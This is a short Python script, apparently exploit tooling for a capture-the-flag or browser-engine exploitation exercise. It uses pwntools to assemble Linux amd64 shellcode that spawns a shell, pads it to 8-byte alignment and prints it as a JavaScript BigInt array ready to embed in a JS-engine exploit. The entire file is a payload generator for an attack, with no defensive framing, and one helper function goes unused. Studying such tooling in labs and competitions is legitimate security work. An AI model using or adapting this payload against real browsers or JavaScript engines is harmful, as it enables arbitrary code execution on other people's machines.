#!/usr/bin/python3

from pwn import *
import base64

context.arch = 'amd64'
context.os = 'linux'

shellcode = asm(shellcraft.sh())

def just4(data):
    size = len(data)
    real_size = size if size % 4 == 0 else size + (4 - size % 4)
    return data.ljust(real_size, b'\x00')

def just8(data):
    size = len(data)
    real_size = size if size % 8 == 0 else size + (8 - size % 8)
    return data.ljust(real_size, b'\x00')

def to_js(data):
    ret = 'var shellcode = ['
    for i in range(0, len(data), 8):
        if (i // 8) % 4 == 0:
            ret += '\n'
        x = u64(data[i:i+8])
        
        ret += '\t' + hex(x) + 'n,'

    ret += '\n];\n'

    return ret

print(to_js(just8(shellcode)))
